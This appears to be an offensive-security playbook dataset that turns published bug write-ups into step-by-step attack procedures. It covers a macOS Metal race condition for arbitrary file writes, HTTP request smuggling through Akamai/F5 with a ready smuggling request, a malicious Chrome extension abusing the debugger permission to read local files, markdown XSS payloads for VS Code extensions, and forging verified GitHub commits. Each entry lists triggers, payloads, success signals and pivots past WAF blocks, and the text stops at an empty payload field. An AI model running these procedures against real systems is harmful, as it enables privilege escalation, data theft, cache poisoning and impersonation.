payloads_or_patterns: env MTL_DUMP_PIPELINES_TO_JSON_FILE=/path/to/attacker/controlled/directory <command_to_launch_target_app>
race condition exploitation requires precise timing and potentially crafting specific files/directories at the rename target.
tools_recommended: dtrace: for observing system calls and understanding the Metal framework's file operations.
fs_usage: to monitor filesystem activity.
Standard OS utilities for file creation and manipulation (e.g., `touch`, `mkdir`, `ln`).
success_indicators: The temporary file created by Metal is successfully renamed to the attacker-controlled filename.
Arbitrary file writes or replacements are observed at the target location after the `rename()` operation.
The attacker gains escalated privileges or achieves the desired malicious outcome (e.g., modifying sensitive system files).
failure_indicators: The temporary file is created but not renamed, or the rename fails without apparent effect.
The application crashes or behaves unexpectedly without achieving the desired file manipulation.

A 403 Forbidden or similar error is encountered if attempting to write to protected directories without sufficient privileges, suggesting the race condition is not exploitable in that context. Pivot: Try to exploit a race condition on a file within a user-accessible directory first.

playbooks.impact: The ability to write to arbitrary file locations on the macOS system, potentially leading to privilege escalation by overwriting sensitive system files (e.g., configuration files, executables), or replacing application binaries.
playbooks.key_lesson: Investigate the behavior of atomic file operations like `rename()` in conjunction with environment variables or application settings that control file paths, as race conditions can lead to bypasses of security controls.

meta.title: HTTP is dead... Long live HTTP?!
meta.category: web cache poisoning, http request smuggling

target_profile.technology: Web Application Firewall (WAF) / Content Delivery Network (CDN) - specifically Akamai and F5 services
tech_stack_fingerprints: Responses from Akamai/F5 managed infrastructure can be inferred
Presence of specific request smuggling gadgets detected by tools like Burp Suite's HTTP Smuggler bApp (e.g., CL-plus gadget)

trigger_conditions.when_to_apply: When a target utilizes Akamai or F5 services for WAF or CDN, and these services exhibit specific behaviors when processing malformed HTTP requests, particularly those related to Content-Length. The presence of CL.0 gadgets is a strong indicator.
prerequisites: Target must be using Akamai or F5 services
Understanding of HTTP Request Smuggling techniques (CL.0, CL.20, TE.CL, etc.) is beneficial.
applicability_signals: Burp Suite HTTP Smuggler bApp detecting CL-plus gadget
Successful verification of a smuggling gadget with a request like `GET /wrtztrw?wrtztrw=wrtztrw`
Responses to malformed POST requests that differ from standard responses, indicating potential request desynchronization.
skip_if: Target does not appear to be using Akamai or F5 infrastructure.
No discernible desynchronization or unusual response patterns are observed after sending malformed requests.
WAF actively blocks or sanitizes the malformed requests before they reach the backend.

recon_steps: Step 1: Scan target endpoints using Burp Suite's HTTP Smuggler bApp with the CL-plus gadget to identify potential request smuggling vulnerabilities.

Step 2: Analyze the responses from the CL-plus gadget scan. Look for unusual patterns or verification requests (e.g., `GET /wrtztrw?wrtztrw=wrtztrw`) that indicate a potential smuggling gadget is being processed.
attack_steps: Step 1: Construct a POST request with a malformed Content-Length header. The Content-Length should be intentionally ambiguous or incorrect, such as `Content-Length: +48`. The request body should contain a subsequent HTTP request.

Step 2: Send the malformed POST request immediately followed by a 'normal' GET request (or another request designed to be processed by the backend). Ensure both are sent within the same TCP connection (often achieved by not closing the connection after the first request).

Step 3: Observe the server's response. If request smuggling is successful, the backend server may process the second request (the one in the body of the malformed POST) as if it were the primary request from the initial connection, potentially leading to unexpected behavior or responses. The first request (the GET) might be processed by the proxy/WAF, while the smuggled request is processed by the backend.
Step 4: To confirm, attempt to smuggle a request that should yield a distinct response, e.g., a request for a sensitive file or a page that shows different content based on user authentication.
payloads_or_patterns:
POST / HTTP/1.1
Host: <TARGET_URL_HOST>
Content-Type: application/x-www-form-urlencoded
Content-Length: +48

GET /some/sensitive/endpoint HTTP/1.1
Host: <TARGET_URL_HOST>
tools_recommended: Burp Suite Professional: For intercepting, modifying, and replaying HTTP requests.
Burp Suite HTTP Smuggler bApp: For automated discovery of request smuggling gadgets.
success_indicators: Receiving a response that corresponds to the 'smuggled' GET request (e.g., content from `/some/sensitive/endpoint`) instead of the expected response for the initial POST request.
Unexpected HTTP status codes or response bodies that do not align with the initial request's intended functionality.
Cache poisoning effects: If the smuggled request targets a resource, and the response is cached by a proxy, subsequent users requesting the original resource may receive the poisoned content.
failure_indicators: Receiving a standard 4xx or 5xx error response from the initial POST request, indicating the malformation was not effectively handled for smuggling.
The server consistently responds with the expected content for the initial POST request, implying no desynchronization.
WAF blocks the request with a 403 Forbidden or similar, before reaching the backend's request processing logic.

playbooks.impact: An attacker can bypass security controls (like WAFs) to access sensitive data, execute arbitrary requests on behalf of other users, or poison the web cache, leading to widespread compromise of user data or application functionality. This is particularly severe as it bypasses layers of security and doesn't require vulnerabilities on the target's internal network.
playbooks.key_lesson: Always test for HTTP request smuggling by sending malformed Content-Length headers and observing the backend response, as modern CDNs and WAFs can desynchronize request processing, enabling bypass of security controls.

meta.title: Uncovering a crazy privilege escalation from Chrome extensions
meta.bounty: $10,000 (mentioned for a similar bug, not this specific one)

trigger_conditions.when_to_apply: When a Chrome extension can be installed and has the 'debugger' or 'devtools' permission, or can exploit an XSS vulnerability in a privileged chrome:// URL.
prerequisites: Attacker can create and distribute a malicious Chrome extension.
The target system is running Google Chrome or ChromeOS.
applicability_signals: The existence of privileged `chrome://` URLs that display user-sensitive information or provide system control.
Presence of known vulnerabilities in Chrome extension APIs like `chrome.debugger`.
Evidence of unsafely rendered HTML content within `chrome://` pages (historical context, less likely now).
skip_if: The Chrome extension's manifest lacks dangerous permissions like 'debugger'.
All observed `chrome://` pages have extremely strict Content Security Policies (CSP) and do not render untrusted HTML.
The target system does not use Google Chrome or ChromeOS.

recon_steps: Step 1: Identify installed Chrome extensions on the target system and examine their permissions.
Step 2: Research known vulnerabilities in Chrome extension APIs, focusing on 'debugger', 'devtools', and file handling.
Step 3: Investigate privileged `chrome://` URLs (e.g., `chrome://downloads`, `chrome://file-manager`, `chrome://settings`, `chrome://os-settings`) for potential XSS or input validation flaws.
attack_steps: Step 1: Develop a Chrome extension that requests high-privilege permissions (e.g., 'debugger').
Step 2: Leverage the 'debugger' permission to inject JavaScript into a privileged `chrome://` URL context (e.g., `chrome://file-manager`).
Step 3: Within the `chrome://file-manager` context, exploit the `localStorage` vulnerability observed to construct `filesystem:chrome://file-manager/external/Downloads-...` URLs.
Step 4: Programmatically open these crafted URLs to access local files, potentially leading to privilege escalation on ChromeOS by interacting with sensitive system components.
payloads_or_patterns: Malformed `filesystem:chrome://file-manager/external/Downloads-<user_hash>/<filename>` URL patterns, extracted from `localStorage`.
JavaScript payload to be injected via `chrome.debugger` targeting `chrome://file-manager`.
tools_recommended: Chrome Developer Tools: For debugging extensions and inspecting `chrome://` pages.
Burp Suite: To proxy and potentially modify network requests if applicable (less so for `chrome://` pages directly).
Custom Chrome Extension Development Environment: To build and test malicious extensions.
success_indicators: The extension successfully reads local files from the user's filesystem via the crafted `filesystem:` URLs.
On ChromeOS, successful interaction with system settings, file management functions, or the terminal via injected JavaScript in privileged contexts.
failure_indicators: The extension fails to inject JavaScript into the `chrome://` page (due to CSP or other restrictions).
The constructed `filesystem:` URLs do not resolve or return incorrect content.
The target system does not exhibit the specific vulnerabilities in `chrome://file-manager` or similar pages.

playbooks.impact: On ChromeOS, this can lead to full system compromise. The extension can modify network settings, install certificates, edit files, run code in the terminal, and essentially perform any action the user can perform from within the browser, which is tightly integrated with the OS.
playbooks.key_lesson: Privileged `chrome://` URLs, especially on integrated operating systems like ChromeOS, present a critical attack surface. Vulnerabilities allowing code execution or unintended data access within these contexts can lead to severe privilege escalation.

meta.title: Visual Studio Code Security: Markdown Vulnerabilities in Third-Party Extensions (2/3)

affected_components: Markdown rendering in extension output panes or tooltips

trigger_conditions.when_to_apply: When a Visual Studio Code extension processes and renders user-controlled or untrusted markdown content without proper sanitization.
prerequisites: Attacker can influence the markdown content displayed by the extension.
applicability_signals: Extension code that uses markdown rendering functions.
Input sources for markdown include files, API responses, or user input fields.
skip_if: Extension explicitly sanitizes all markdown inputs using a robust library.

recon_steps: Step 1: Identify VS Code extensions that display markdown content in their UI (e.g., output channels, webviews, tooltips).
Step 2: Review the extension's source code for functions related to markdown parsing or rendering, looking for direct use of potentially unsafe parsers or insufficient input sanitization.
attack_steps: Step 1: Craft malicious markdown content containing specific injection payloads (e.g., HTML tags, JavaScript via `[alt text](javascript:...)`).
Step 2: Provide this malicious markdown content as input to the vulnerable extension (e.g., by creating a specific file, triggering an API call, or interacting with a UI element).
Step 3: Observe the rendered output in the VS Code UI to confirm successful injection.
payloads_or_patterns: Payloads can include arbitrary HTML tags (`<script>alert(1)</script>`), `javascript:` URIs in image or link `src`/`href` attributes.
Example: `![malicious](javascript:alert('XSS'))`
tools_recommended: VS Code Debugger: To step through extension code and identify rendering functions.
Manual code review: To analyze markdown processing logic.
success_indicators: Execution of injected JavaScript code (e.g., an alert box pops up).
Rendering of unexpected HTML elements or styling that deviate from standard markdown.
failure_indicators: Markdown is rendered as plain text without executing scripts or rendering HTML.
A 403 or similar error if a WAF is present and capable of detecting such patterns in the input stage (less likely for client-side extensions).

playbooks.impact: Arbitrary code execution within the VS Code process, potentially leading to full system compromise if the extension runs with elevated privileges.
playbooks.key_lesson: Always sanitize user-controlled markdown input before rendering it within VS Code extensions, paying close attention to script execution and HTML tag interpretation.

meta.title: Forging signed commits on GitHub

trigger_conditions.when_to_apply: When a GitHub Codespace with GPG signing enabled is used, and the internal commit signing API can be triggered with crafted commit data.
prerequisites: Attacker has access to a GitHub Codespace with GPG signing enabled.
Attacker can control the content of a Git commit before it is signed.
applicability_signals: GitHub UI displays 'Verified' or 'Signed' status for commits created in Codespaces.
Commit message format includes 'gpgsig' header.
skip_if: GitHub Codespaces is not in use, or GPG signing is not enabled.
The internal commit signing API has been patched to strictly validate author lines.

recon_steps: Step 1: Identify if the target environment uses GitHub Codespaces and if GPG signing is enabled for commits.
Step 2: Analyze the Git commit structure, specifically looking for the 'author' and 'committer' lines and the 'gpgsig' header in signed commits.
attack_steps: Step 1: Craft a raw Git commit message. Include a valid 'tree' and 'parent' hash.

Step 2: Insert an 'author' line with a zero-length name, followed by a valid email address in the format `<user@example.com>` (e.g., `author <attacker@example.com>`). This is to bypass the initial regex check.

Step 3: Add a second 'author' line with the desired legitimate author's name and email (e.g., `author LegitimateUser <legit_user@example.com>`). Git will use this line as the author, but the API might process the first one.
Step 4: Add the 'committer' line with the attacker's details or any desired committer.
Step 5: Include a commit message.

Step 6: Trigger the internal GitHub Codespaces commit signing API (`/vscs_internal/commit/sign`) with the crafted raw commit body as input. This is typically done via the `gh-gpgsign` binary within a Codespace.
Step 7: Receive the signed commit data, which will now contain a signature that GitHub's UI will interpret as legitimate, but forged with the desired author.
payloads_or_patterns:
